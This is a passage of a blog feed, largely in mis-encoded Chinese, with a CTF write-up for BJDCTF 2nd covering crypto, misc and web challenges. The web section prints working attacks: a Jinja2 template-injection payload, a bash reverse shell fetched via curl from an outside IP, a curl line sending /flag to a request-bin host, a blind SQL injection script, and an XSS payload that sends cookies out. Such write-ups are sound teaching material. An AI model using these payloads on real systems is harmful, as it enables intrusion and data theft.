rel="noopener">https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/#%E7%BD%91%E4%B8%8A%E7%9A%84%E4%B8%80%E4%B8%AA%E8%84%9A%E6%9C%AC</a></p><p>å‚è€ƒèµ„æ–™ï¼š</p><blockquote><p><a href="https://xz.aliyun.com/t/4688#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/4688#toc-8</a></p><p><a href="https://www.anquanke.com/post/id/197745#h3-8" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197745#h3-8</a></p><p><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p><p><a href="https://glotozz.github.io/2020/02/26/ä»ä¸€é“é¢˜å­¦ä¹ bypass-disable-func/#ä¸€-dl-æ‹“å±•åº“ç»•è¿‡" target="_blank" rel="noopener">https://glotozz.github.io/2020/02/26/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0bypass-disable-func/#%E4%B8%80-dl-%E6%8B%93%E5%B1%95%E5%BA%93%E7%BB%95%E8%BF%87</a></p><p><a href="https://lihuaiqiu.github.io/2019/10/09/Bypass-disabled-functions-open-basedir-php/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/10/09/Bypass-disabled-functions-open-basedir-php/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> tricks </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> Bypass disabled_functions </tag>
            
            <tag> Bypass open_basedir </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF 2ndè§£é¢˜è®°å½•</title>
      <link href="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="0x-01-ç­¾åˆ°"><a href="#0x-01-ç­¾åˆ°" class="headerlink" title="0x 01 ç­¾åˆ°"></a>0x 01 ç­¾åˆ°</h4><p>base64è§£ç ï¼Œå¾—åˆ°flagï¼š<code>BJD{W3lc0me_T0_BJDCTF}</code></p><h4 id="0x-02-ç‡•è¨€ç‡•è¯­"><a href="#0x-02-ç‡•è¨€ç‡•è¯­" class="headerlink" title="0x 02 ç‡•è¨€ç‡•è¯­"></a>0x 02 ç‡•è¨€ç‡•è¯­</h4><p>åå…­è¿›åˆ¶asciiè§£ç å¾—åˆ°<code>yanzi ZJQ{xilzv_iqssuhoc_suzjg}</code>,æœ‰ç§˜é’¥å’Œå¯†æ–‡ï¼Œä½¿ç”¨ç»´å‰å°¼äºšè§£å¯†å¾—åˆ°flagï¼š<code>BJD{yanzi_jiushige_shabi}</code></p><h4 id="0x-03-Y1nglish"><a href="#0x-03-Y1nglish" class="headerlink" title="0x 03 Y1nglish"></a>0x 03 Y1nglish</h4><p>cryptogramï¼Œä½¿ç”¨<a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a> è¿›è¡Œè¯é¢‘åˆ†æ<code>BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck}</code></p><h4 id="0x-04-è€æ–‡ç›²äº†"><a href="#0x-04-è€æ–‡ç›²äº†" class="headerlink" title="0x 04 è€æ–‡ç›²äº†"></a>0x 04 è€æ–‡ç›²äº†</h4><p>å‰ä¸‰ä¸ªè¯»éŸ³è°éŸ³æ˜¯bjd,åŠ ä¸Šæ‹¬å·å¾—åˆ°flag:<code>BJD{æ·›åŒ¶è¥«é»¼ç€¬é¶è»„é¶›é©•é³“å“µ}</code></p><h4 id="0x-05-cat-flag"><a href="#0x-05-cat-flag" class="headerlink" title="0x 05 cat_flag"></a>0x 05 cat_flag</h4><p>è½¬äºŒè¿›åˆ¶0å’Œ1ï¼Œç„¶åè½¬æ¢æˆasciiç <code>BJD{M!a0~}</code></p><h4 id="0x-06-çµèƒ½ç²¾é€š"><a href="#0x-06-çµèƒ½ç²¾é€š" class="headerlink" title="0x 06 çµèƒ½ç²¾é€š"></a>0x 06 çµèƒ½ç²¾é€š</h4><p>åœ£å ‚æ­¦å£«å¯†ç ï¼Œ<code>flag{imknightstemplar}</code></p><h4 id="0x-07-rsa0"><a href="#0x-07-rsa0" class="headerlink" title="0x 07 rsa0"></a>0x 07 rsa0</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python2</span><br><span class="line">#coding:utf-8</span><br><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line">a &#x3D; 19625999955447888696390122377840961046753166968795603958063759044864679839536144670602538259831709040965956732805593396708352122584482022376941163677038630</span><br><span class="line">b &#x3D; -6176456758340029098089723810501754297130222103009042736616635563726055049689190205055246912914622570674537736155897459910194725001900500831842809740927188</span><br><span class="line">p &#x3D; (a+b)&#x2F;&#x2F;2</span><br><span class="line">q &#x3D; a - p</span><br><span class="line">n &#x3D; p*q</span><br><span class="line">e &#x3D; 11599829</span><br><span class="line">phi_n &#x3D; (p-1)*(q-1)</span><br><span class="line">d &#x3D; gmpy2.invert(e, phi_n)</span><br><span class="line">c&#x3D;56321185753972151625933543608447787603473765973133149195380115478652285169342828192188623886133346029943442805825230692586385224853985274428971911119067878344128774137755834569527854261217660651515751605050298584366067378011417778663843804831679164271995792961169460893723530652355646614029892945792281751318</span><br><span class="line"></span><br><span class="line">m &#x3D; pow(c, d, n)</span><br><span class="line">m_hex &#x3D; hex(m)[2:]</span><br><span class="line">print(&quot;ascii:\n%s&quot;%(binascii.a2b_hex(m_hex).decode(&quot;utf8&quot;),))</span><br></pre></td></tr></table></figure><h4 id="0x-08-rsa1"><a href="#0x-08-rsa1" class="headerlink" title="0x 08 rsa1"></a>0x 08 rsa1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python2</span><br><span class="line">#coding:utf-8</span><br><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line">pq2&#x3D;132460282208391991552504764158634319936843554116715219469744299565888922214090496383771423130754188072840177198713136552967515380145051097065304848247872626812877510785478194570333764592747579974257129121686553068266545388629795106936696480440573976108980624756620858768409569815902492696692024566751096101450</span><br><span class="line">p_q&#x3D;-2358553385115093812029178776311290326692733442577350424602482420585435891550592627378204257296268157330536400908927134081281776410533122724646838983965214</span><br><span class="line"></span><br><span class="line">twopq &#x3D; pq2-p_q*p_q</span><br><span class="line">print twopq</span><br><span class="line">paddq &#x3D; gmpy2.iroot(pq2+twopq, 2)[0]</span><br><span class="line">p &#x3D; (p_q + paddq)&#x2F;&#x2F;2</span><br><span class="line">q &#x3D; paddq - p</span><br><span class="line">n &#x3D; p*q</span><br><span class="line">e &#x3D; 14210467</span><br><span class="line">phi_n &#x3D; (p-1)*(q-1)</span><br><span class="line">d &#x3D; gmpy2.invert(e, phi_n)</span><br><span class="line">c&#x3D;54150517220650140028230395502829113080080100957324148844875007477604158600988888413131474639870810651777850996192670627127105245333421193508379548496607689697581005727782733578377221590747840584310825695104670904142592120874252688132880343575146089908272336108371364352105123041459289967694652573340235143783</span><br><span class="line">m &#x3D; pow(c, d, n)</span><br><span class="line">m_hex &#x3D; hex(m)[2:]</span><br><span class="line">print(&quot;ascii:\n%s&quot;%(binascii.a2b_hex(m_hex).decode(&quot;utf8&quot;),))</span><br></pre></td></tr></table></figure><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x-01-Real-EasyBaBa"><a href="#0x-01-Real-EasyBaBa" class="headerlink" title="0x 01 Real_EasyBaBa"></a>0x 01 Real_EasyBaBa</h4><p>ä½¿ç”¨åå…­è¿›åˆ¶æ‰“å¼€ï¼Œå›¾å½¢åŒ–flagï¼š<code>BJD{572154976}</code></p><p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200321111737691.png" alt></p><h4 id="0x-02-æœ€ç®€å•çš„misc"><a href="#0x-02-æœ€ç®€å•çš„misc" class="headerlink" title="0x 02 æœ€ç®€å•çš„misc"></a>0x 02 æœ€ç®€å•çš„misc</h4><p>zipä¼ªåŠ å¯†ï¼š<code>java -jar ZipCenOp.jar r secret.zip</code></p><p>æ·»åŠ pngæ–‡ä»¶å¤´,å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œå›¾ä¸­çš„å­—æ¯è½¬16è¿›åˆ¶asciiå¾—åˆ°flag</p><p><code>BJD{y1ngzuishuai}</code></p><h4 id="0x-03-A-Beautiful-Picture"><a href="#0x-03-A-Beautiful-Picture" class="headerlink" title="0x 03 A_Beautiful_Picture"></a>0x 03 A_Beautiful_Picture</h4><p>é«˜åº¦éšå†™ï¼Œ<code>BJD{PnG_He1ghT_1s_WR0ng}</code></p><h4 id="0x-04-åœ£ç«æ˜­æ˜­"><a href="#0x-04-åœ£ç«æ˜­æ˜­" class="headerlink" title="0x 04 åœ£ç«æ˜­æ˜­"></a>0x 04 åœ£ç«æ˜­æ˜­</h4><p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200321120107247.png" alt></p><p>æç¤ºæ–°ä½›æ›°ï¼Œä½¿ç”¨<a href="http://hi.pcmoe.net/buddha.htmlè§£å¯†ï¼Œå¾—åˆ°gemlovecom" target="_blank" rel="noopener">http://hi.pcmoe.net/buddha.htmlè§£å¯†ï¼Œå¾—åˆ°gemlovecom</a></p><p>æ ¹æ®é¢˜ç›®æç¤ºçŒœæµ‹æ˜¯outguesséšå†™ï¼Œä½¿ç”¨ç›¸åº”æ‰“çš„è§£å¯†å·¥å…·è§£å¯†å¾—åˆ°</p><p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200321130141007.png" alt></p><p>BJD{wdnmd_misc_1s_so_Fuck1ng_e@sy}</p><h4 id="0x-05-TARGZ"><a href="#0x-05-TARGZ" class="headerlink" title="0x 05 TARGZ"></a>0x 05 TARGZ</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-    </span><br><span class="line">import os</span><br><span class="line">key &#x3D; &quot;&quot;</span><br><span class="line">filename &#x3D; &quot;&quot;</span><br><span class="line">while True:</span><br><span class="line">datanames &#x3D; os.listdir(&quot;.&#x2F;&quot;)</span><br><span class="line">for dataname in datanames:</span><br><span class="line">    if dataname.find(&quot;.tar.gz&quot;)!&#x3D;-1:</span><br><span class="line">key &#x3D; dataname.replace(&quot;.tar.gz&quot;,&quot;&quot;)</span><br><span class="line">filename &#x3D; dataname</span><br><span class="line">uncmd &#x3D; &quot;unzip -q -P &quot; + key + &quot; &quot; + filename</span><br><span class="line">os.system(uncmd)</span><br><span class="line">rmcmd &#x3D; &quot;rm -f &quot; + filename</span><br><span class="line">os.system(rmcmd)</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶åæ˜¯è§£å‹å¯†ç ï¼Œå†™äº†ä¸€ä¸ªpythonè„šæœ¬ä¸€ç›´è§£å‹å°±è¡Œäº†ï¼Œæœ€åflagæ˜¯<code>BJD{wow_you_can_rea11y_dance}</code>ï¼Œèµ›åçœ‹äº†ä¸€ä¸‹wpå¯ä»¥ä½¿ç”¨filetypeåº“åˆ¤æ–­æ–‡ä»¶ç±»å‹</p><h4 id="0x-06-Imagin"><a href="#0x-06-Imagin" class="headerlink" title="0x 06 Imagin"></a>0x 06 Imagin</h4><p>å¬åŠ›é¢˜ï¼Œå‚è€ƒ<a href="https://aidn.jp/mikutap/ï¼Œflagæ˜¯`BJD{MIKUTAP3313313}`" target="_blank" rel="noopener">https://aidn.jp/mikutap/ï¼Œflagæ˜¯`BJD{MIKUTAP3313313}`</a></p><h4 id="0x-07-EasyBaBa"><a href="#0x-07-EasyBaBa" class="headerlink" title="0x 07 EasyBaBa"></a>0x 07 EasyBaBa</h4><p>åˆ†ç¦»å‡ºè§†é¢‘ï¼Œç„¶åå‡ºç°å‡ å¼ äºŒç»´ç ï¼Œä¿®å¤æ‰«ç æˆ–è€…ä½¿ç”¨QR_Researchè®¾ç½®å®¹é”™ç‡æ‰«ç ï¼Œè§£å‡º base16 å­—ç¬¦ä¸²æ …æ åå¾—åˆ°<code>BJD{imagin_love_Y1ng}</code></p><h3 id="0x-08-å°å§å§"><a href="#0x-08-å°å§å§" class="headerlink" title="0x 08 å°å§å§"></a>0x 08 å°å§å§</h3><p>winhexæ‰“å¼€æœç´¢BJDå­—ç¬¦ä¸²ï¼Œå¾—åˆ°flagï¼š<code>BJD{haokanma_xjj}</code></p><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="0x-01-fake-google"><a href="#0x-01-fake-google" class="headerlink" title="0x 01 fake google"></a>0x 01 fake google</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#39;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a>  ä½¿ç”¨tplmapä¸€æŠŠæ¢­</p><p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200321211250734.png" alt></p><h4 id="0x-02-old-hack"><a href="#0x-02-old-hack" class="headerlink" title="0x 02 old-hack"></a>0x 02 old-hack</h4><p>ä½¿ç”¨TP-SCanä¸€æŠŠæ¢­ï¼Œå‘ç°æ˜¯5.0.23çš„RCE</p><h4 id="0x-03-duangShell"><a href="#0x-03-duangShell" class="headerlink" title="0x 03 duangShell"></a>0x 03 duangShell</h4><p>è®¿é—®/.index.php.swpå¾—åˆ°æºç ï¼Œç”¨<code>vim -r index.php</code>æ¢å¤æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;ççˆ±ç½‘&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">if (!isset($_POST[&#39;girl_friend&#39;])) &#123;</span><br><span class="line">    die(&quot;where is P3rh4ps&#39;s girl friend ???&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $girl &#x3D; $_POST[&#39;girl_friend&#39;];</span><br><span class="line">    if (preg_match(&#39;&#x2F;\&gt;|\\\&#x2F;&#39;, $girl)) &#123;</span><br><span class="line">        die(&#39;just girl&#39;);</span><br><span class="line">    &#125; else if (preg_match(&#39;&#x2F;ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$&#x2F;i&#39;, $girl)) &#123;</span><br><span class="line">        echo &quot;&lt;img src&#x3D;&#39;img&#x2F;p3_need_beautiful_gf.png&#39;&gt; &lt;!-- He is p3 --&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        &#x2F;&#x2F;duangShell~~~~</span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>exec()</code>æ— å›æ˜¾ï¼Œæ‰€ä»¥é¦–é€‰åå¼¹shellã€‚å…ˆåœ¨ç½‘ç«™çš„æ ¹ç›®å½•åˆ›å»ºä¸€ä¸ªshell.txt,å†™å…¥åå¼¹shellè¯­å¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;[port] 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨æ”»å‡»æœºç«¯æ‰§è¡Œ</p><p>girl_friend=curl <a href="http://174.1.83.107/shell.txt|bash" target="_blank" rel="noopener">http://174.1.83.107/shell.txt|bash</a></p><p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200323234620118.png" alt></p><p>å‘ç°/flag æ˜¯å‡çš„ï¼Œç„¶ååˆ©ç”¨ find å‘½ä»¤æ‰¾åˆ° flagï¼Œ<code>find / -name flag</code></p><p>ä¹‹å‰æ™šä¸Šflagä½ç½®æ²¡å˜çš„æ—¶å€™å¯ä»¥ç›´æ¥å¸¦å‡º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;requestbin.xxx -X POST -d &quot;&#96;head &#x2F;flag&#96;&quot;</span><br></pre></td></tr></table></figure><h3 id="0x-04-ç®€å•æ³¨å…¥"><a href="#0x-04-ç®€å•æ³¨å…¥" class="headerlink" title="0x 04 ç®€å•æ³¨å…¥"></a>0x 04 ç®€å•æ³¨å…¥</h3><p>è®¿é—®robots.txtï¼Œå¾—åˆ°hint.txtæç¤ºï¼Œè®¿é—®å¾—åˆ°åå°SQLè¯­å¥æç¤ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;$_POST[&quot;username&quot;]&#39; and password&#x3D;&#39;$_POST[&quot;password&quot;]&#39;;</span><br></pre></td></tr></table></figure><p>æ ¹æ®è¯­å¥åˆ†æå¯ä»¥é€šè¿‡æ–œæ è½¬ä¹‰æ¥é€ƒé€¸å•å¼•å·ï¼Œå¥—ç”¨<a href="https://www.zhihu.com/people/yoshino-34" target="_blank" rel="noopener">yoshino-s</a>çš„è„šæœ¬ï¼Œexpå†™çš„éå¸¸æ•´æ´ç¾è§‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;946de4c6-b1c6-4c0b-be3e-769a8f871538.node3.buuoj.cn&#x2F;index.php&#39;</span><br><span class="line"></span><br><span class="line">def inj(payload):</span><br><span class="line">    req&#x3D;requests.post(url,data&#x3D;&#123;&#39;password&#39;:payload, &#39;username&#39;:&#39;s\\&#39;&#125;)</span><br><span class="line">    if &#39;BJD needs to be stronger&#39; in req.text:</span><br><span class="line">        return True</span><br><span class="line">result&#x3D;&#39;&#39;</span><br><span class="line"></span><br><span class="line">db &#x3D; &#39;p3rh4ps&#39;</span><br><span class="line">password&#x3D;&#39;OhyOuFOuNdit&#39;</span><br><span class="line"></span><br><span class="line">for x in range(1, 50):</span><br><span class="line">    high &#x3D; 127</span><br><span class="line">    low &#x3D; 32</span><br><span class="line">    mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line">    while high &gt; low:</span><br><span class="line">        payload &#x3D; &quot; or ascii(substr(password, %d,1))&gt;%d #&quot; % (x, mid)</span><br><span class="line">        # payload &#x3D; &quot; or ascii(substr(username, %d,1))&gt;%d #&quot; % (x, mid)</span><br><span class="line">        print(payload)</span><br><span class="line">        res &#x3D; inj(payload)</span><br><span class="line">        if res:</span><br><span class="line">            low &#x3D; mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high &#x3D; mid</span><br><span class="line">        mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line"></span><br><span class="line">    result +&#x3D; chr(int(mid))</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç”¨æˆ·å<code>admin</code>ï¼Œå¯†ç <code>OhyOuFOuNdit</code>,ç™»å½•å¾—åˆ°flag</p><p>å¦å¤–å¦‚æœä½¿ç”¨æ­£åˆ™æ³¨å…¥éœ€è¦æ³¨æ„regexpåŒ¹é…åœ¨3.23.4ç‰ˆæœ¬åæ˜¯ä¸åˆ†å¤§å°å†™çš„ï¼Œè¦åŠ ä¸Š<code>binary</code>å…³é”®å­—</p><h3 id="0x-05-å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"><a href="#0x-05-å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€" class="headerlink" title="0x 05 å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"></a>0x 05 å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€</h3><p>1.éšä¾¿è¾“å…¥è´¦å·å¯†ç ç™»å½•æŠ“åŒ…å‘ç°æœ‰302è·³è½¬ï¼Œæç¤ºäº†è®¿é—®L0g1n.phpï¼Œå‘ŠçŸ¥:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sorry, this site will be available after totally 99 years!</span><br></pre></td></tr></table></figure><p>cookieå¤„å‘ç°ä¸€ä¸ªå«timeçš„cookieï¼Œå­˜æ”¾çš„æ˜¯å½“å‰çš„æ—¶é—´æˆ³ï¼ŒæŠŠä»–æ”¹å¤§æ”¹åˆ°99å¹´ä»¥åå³å¯ã€‚</p><p>å‰©ä¸‹æ ¹æ®æç¤ºè¿›è¡Œä¿®æ”¹ï¼š</p><p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/E:%5CHexo-Blog%5Csource_posts%5CBUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89%5Cimage-20200324002542942.png" alt="image-20200324002542942"></p><h3 id="0x-06-xssä¹‹å…‰"><a href="#0x-06-xssä¹‹å…‰" class="headerlink" title="0x 06 xssä¹‹å…‰"></a>0x 06 xssä¹‹å…‰</h3><p>gitæ³„éœ²ï¼Œç›´æ¥GitHackå¾—åˆ°æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; $_GET[&#39;yds_is_so_beautiful&#39;];</span><br><span class="line">echo unserialize($a);</span><br></pre></td></tr></table></figure><p>å‚è€ƒè¿™ä¸€ç¯‡æ–‡ç« ï¼š<a href="http://blog.ydspoplar.top/2020/03/17/php%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E5%8E%9F%E7%94%9F%E7%B1%BB/" target="_blank" rel="noopener">http://blog.ydspoplar.top/2020/03/17/php%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E5%8E%9F%E7%94%9F%E7%B1%BB/</a></p><p>é¢˜ç›®ç¯å¢ƒæ˜¯php5ï¼Œæ‰€ä»¥ä½¿ç”¨<code>Exception</code>ååºåˆ—åŒ–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$test &#x3D; new Exception(&#39;&quot;&lt;script&gt;window.open(\&#39;http:&#x2F;&#x2F;174.1.83.107:9999&#x2F;?\&#39;+document.cookie);&lt;&#x2F;script&gt;&#39;);</span><br><span class="line">echo urlencode(serialize($test));</span><br><span class="line"></span><br><span class="line">æˆ–è€…ï¼š</span><br><span class="line">$a &#x3D; new Exception(&quot;&lt;script src&#x3D;http:&#x2F;&#x2F;xss.buuoj.cn&#x2F;z01e5x&gt;&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>åœ¨è¿”å›æŠ¥æ–‡çš„cookieé‡Œé¢å¾—åˆ°flag</p><h3 id="0x-07-SchroÌˆdinger"><a href="#0x-07-SchroÌˆdinger" class="headerlink" title="0x 07 SchroÌˆdinger"></a>0x 07 SchroÌˆdinger</h3><p>è„‘æ´é¢˜ã€‚ã€‚</p><h3 id="0x-08-elementmaster"><a href="#0x-08-elementmaster" class="headerlink" title="0x 08 elementmaster"></a>0x 08 elementmaster</h3><p>åŒ–å­¦é¢˜ã€‚ã€‚</p><h3 id="0x-09-æ–‡ä»¶æ¢æµ‹"><a href="#0x-09-æ–‡ä»¶æ¢æµ‹" class="headerlink" title="0x 09 æ–‡ä»¶æ¢æµ‹"></a>0x 09 æ–‡ä»¶æ¢æµ‹</h3><ol><li>æ ¹æ®æºä»£ç æç¤ºæŸ¥çœ‹headerï¼Œæç¤ºè®¿é—®<code>home.php</code></li></ol><p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200324193518340.png" alt></p><ol start="2"><li>urlå‚æ•°è¿™é‡Œæ€€ç–‘å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œç”¨ä¼ªåè®®è¯»ä¸€ä¸‹system.phpçš„æºç ï¼Œå¦‚ä¸‹</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 